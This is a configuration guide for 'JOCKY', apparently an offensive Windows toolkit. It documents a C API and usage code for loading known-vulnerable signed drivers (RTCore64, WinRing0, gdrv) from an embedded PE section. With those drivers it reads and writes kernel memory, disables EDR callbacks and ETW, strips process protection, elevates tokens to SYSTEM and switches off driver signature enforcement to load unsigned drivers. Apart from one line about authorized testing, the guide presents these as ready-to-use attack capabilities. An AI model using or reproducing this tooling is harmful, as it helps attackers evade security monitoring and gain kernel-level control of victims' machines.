# JOCKY Driver Configuration Guide

This guide explains how to configure and use drivers with JOCKY's runtime framework.

## Overview

JOCKY provides two complementary systems for driver interaction:

### 1. **Static Profiles** (Built-in)
Pre-configured support for common drivers:
- **RTCore64** – MSI Afterburner (physical memory R/W)
- **WinRing0** / **WinRing0x64** – CPU-Z, HWiNFO (physical memory + MSR R/W)
- **gdrv** – GIGABYTE utility (physical address mapping)

No manifest needed – just load the driver and use high-level primitives.

### 2. **Dynamic Manifests** (Custom)
Embed driver profiles at build time via `--manifest` flag.
Maps arbitrary primitive names to IOCTL codes and buffer layouts.

---

## Architecture

### Driver Context (`jocky_byovd_t`)

```c
typedef struct {
    HANDLE device;                  // Open device handle
    char   driver_path[MAX_PATH];   // Path of dropped .sys
    char   service_name[64];        // SCM service name
} jocky_byovd_t;
```

The context is returned by `jocky_byovd_load()` and passed to all driver operations.

### .jdrv Section

The binary contains a `.jdrv` PE section holding the embedded driver:

```
[Binary] → Extract .jdrv → Drop to %TEMP%\xxx.sys
         → Register SCM service → Start → Open device handle
```

### .jmani Section (Optional)

Custom driver profiles embedded at build time:

```
[4]  magic    "JMNI"
[4]  version  0x00000001
[4]  count    number of entries
Per entry:
  [1]  name_len
  [N]  name (no null terminator)
  [4]  ioctl   control code
  [2]  in_size  expected input bytes
  [2]  out_size expected output bytes
```

---

## Quick Start

### Example 1: Load a BYOVD Driver (JOCKY)

```jocky
ffi jocky_byovd_new() -> i64;
ffi jocky_byovd_load(service_name: i64, device_name: i64, ctx: i64) -> bool;
ffi jocky_byovd_unload(ctx: i64) -> void;
ffi jocky_byovd_destroy(ctx: i64) -> void;

fn main() -> i32 {
    let ctx: i64 = jocky_byovd_new();
    
    // Load driver from .jdrv section
    // NULL service_name and device_name → auto-generated
    if !jocky_byovd_load(0, 0, ctx) {
        return 1;
    }
    
    // Use driver here...
    
    jocky_byovd_unload(ctx);
    jocky_byovd_destroy(ctx);
    return 0;
}
```

### Example 2: Read Physical Memory (C)

```c
#include <jocky_rt.h>

int main() {
    jocky_byovd_t ctx = {0};
    
    // Load driver
    if (!jocky_byovd_load(NULL, NULL, &ctx)) {
        return 1;
    }
    
    // Read 256 bytes from physical address 0x1000
    uint8_t buf[256];
    if (jocky_driver_read_phys(&ctx, 0x1000, buf, sizeof(buf))) {
        printf("Read OK\n");
    }
    
    jocky_byovd_unload(&ctx);
    return 0;
}
```

---

## High-Level Primitives

### Physical Memory Operations

**Read physical memory:**
```c
bool jocky_driver_read_phys(jocky_byovd_t* ctx, 
                             uint64_t phys_addr,
                             void* out, 
                             uint32_t size);
```

Tries static profiles first (RTCore64, WinRing0), falls back to manifest.

**Write physical memory:**
```c
bool jocky_driver_write_phys(jocky_byovd_t* ctx,
                              uint64_t phys_addr,
                              const void* in,
                              uint32_t size);
```

### Model-Specific Register (MSR) Operations

**Read MSR:**
```c
bool jocky_driver_read_msr(jocky_byovd_t* ctx,
                            uint32_t msr_id,
                            uint64_t* out);
```

Supported: WinRing0, WinRing0x64 only.

**Write MSR:**
```c
bool jocky_driver_write_msr(jocky_byovd_t* ctx,
                             uint32_t msr_id,
                             uint64_t val);
```

### Physical Address Mapping

**Map physical address (gdrv only):**
```c
bool jocky_driver_map_phys(jocky_byovd_t* ctx,
                            uint64_t phys_addr,
                            uint32_t size,
                            uintptr_t* out_va);
```

Returns kernel virtual address of the mapped region.

### Generic IOCTL Dispatch

**Invoke custom primitives via manifest:**
```c
bool jocky_driver_invoke(jocky_byovd_t* ctx,
                         const char* primitive,
                         const void* in_buf,
                         uint32_t in_size,
                         void* out_buf,
                         uint32_t out_size);
```

---

## Kernel Exploitation Primitives

Once a BYOVD driver is loaded, high-level kernel operations become available:

### Kernel Virtual Memory Access

```c
// Read kernel virtual memory
bool jocky_kread(jocky_byovd_t* ctx, uint64_t kva, 
                 void* out, uint32_t size);

// Write kernel virtual memory
bool jocky_kwrite(jocky_byovd_t* ctx, uint64_t kva,
                  const void* in, uint32_t size);
```

Internally performs 4-level page table walk via physical memory.

### EDR/ETW Disabling

```c
// Disable EDR kernel callbacks
bool jocky_disable_edr_callbacks(jocky_byovd_t* ctx);

// Disable general kernel ETW
bool jocky_disable_etw(jocky_byovd_t* ctx);

// Disable Threat Intelligence ETW (targeted provider)
bool jocky_disable_etw_ti(jocky_byovd_t* ctx);

// Disable Object Manager callbacks
bool jocky_disable_ob_callbacks(jocky_byovd_t* ctx);
```

### Process Manipulation

```c
// Strip Process Protection Level (PPL)
bool jocky_strip_ppl(jocky_byovd_t* ctx, uint32_t pid);

// Elevate process token to SYSTEM
bool jocky_elevate_token(jocky_byovd_t* ctx, uint32_t target_pid);

// Downgrade excessive privileges
bool jocky_downgrade_token(jocky_byovd_t* ctx, uint32_t target_pid);
```

### Driver Signature Enforcement (DSE)

```c
// Disable DSE in a PatchGuard-safe window
bool jocky_disable_dse(jocky_byovd_t* ctx);

// Restore DSE to original value
bool jocky_restore_dse(jocky_byovd_t* ctx);

// Load unsigned driver atomically within DSE window
bool jocky_dse_load_driver(jocky_byovd_t* ctx,
                           const wchar_t* driver_path,
                           const char* service_name);
```

---

## Custom Driver Profiles (Manifest)

### Create a Manifest File

Save as `driver_manifest.yaml`:

```yaml
driver: my_custom_driver
device_name: \\.\MyDriver

primitives:
  read_memory:
    ioctl: 0x12345678
    in_size: 16        # size | addr (4+8 bytes)
    out_size: 4096     # output buffer size
    
  write_memory:
    ioctl: 0x87654321
    in_size: 4112      # size | addr | data (4+8+4096 bytes)
    out_size: 0
    
  custom_op:
    ioctl: 0xABCD1234
    in_size: 256
    out_size: 512
```

### Build with Manifest

```bash
# C++/C compilation
jockyc mycode.c --manifest driver_manifest.yaml -o binary.exe

# JOCKY language
jocky build mycode.jky --manifest driver_manifest.yaml -o binary.exe
```

### Invoke at Runtime

```c
#include <jocky_rt.h>

int main() {
    jocky_byovd_t ctx = {0};
    jocky_byovd_load(NULL, NULL, &ctx);
    
    // Manifest is auto-loaded from .jmani section
    uint8_t in[16] = {/* data */};
    uint8_t out[4096] = {0};
    
    if (jocky_driver_invoke(&ctx, "read_memory", in, 16, out, 4096)) {
        printf("Custom primitive invoked\n");
    }
    
    jocky_byovd_unload(&ctx);
    return 0;
}
```

---

## Static Profile Auto-Detection

The runtime auto-detects which profile to use based on `ctx->service_name`:

| Service Name | Device | Primitives |
|---|---|---|
| `RTCore64` | `\\.\RTCore64` | read_phys, write_phys |
| `WinRing0` | `\\.\WinRing0_1_2_0` | read_phys, write_phys, read_msr, write_msr |
| `WinRing0x64` | `\\.\WinRing0x64_1_2_0` | read_phys, write_phys, read_msr, write_msr |
| `gdrv` | `\\.\GIO` | map_phys |

If the driver is not recognized, the runtime falls back to manifest invocation.

---

## Examples

See `examples/driver_config_demo.jky` for a complete walkthrough:

```bash
# Build the demo
jocky build examples/driver_config_demo.jky -o demo.exe

# Run (requires admin)
demo.exe
```

---

## Memory Management

JOCKY provides allocation helpers for consistency:

```c
// Allocate zero-initialized buffer
void* jocky_alloc(int64_t size);

// Free a buffer
void jocky_free(void* ptr);

// Allocate & destroy BYOVD context
void* jocky_byovd_new(void);
void jocky_byovd_destroy(void* ctx);
```

---

## Troubleshooting

### "Failed to load BYOVD driver"
- Binary doesn't contain a `.jdrv` section
- No admin privileges
- SeLoadDriverPrivilege not enabled
- Anti-malware is blocking driver operations

### "Primitive not found in manifest"
- Manifest wasn't embedded (build with `--manifest`)
- Primitive name doesn't match manifest exactly (case-sensitive)
- Manifest is malformed

### "Read/Write failed"
- Driver doesn't support that primitive
- Buffer sizes don't match driver expectations
- Physical address is invalid or requires elevated access

### "EDR callbacks not disabled"
- Driver isn't from the static table (manifest primitive required)
- Kernel structure layout changed on newer Windows versions
- Access violation occurred (crash likely)

---

## Security Considerations

- Requires **Administrator** privileges
- Requires **SeLoadDriverPrivilege** for `jocky_dse_load_driver()`
- Requires **SeDebugPrivilege** for some kernel operations
- All operations are **post-detection** by design (EDR sees the action)
- Use within authorized testing environments only

---

## References

- Runtime API: `src/runtime/include/jocky_rt.h`
- Driver interaction: `src/runtime/execution/driver_interact.c`
- BYOVD loader: `src/runtime/execution/byovd.c`
- Kernel exploitation: `src/runtime/exploitation/kernel_exploit.c`
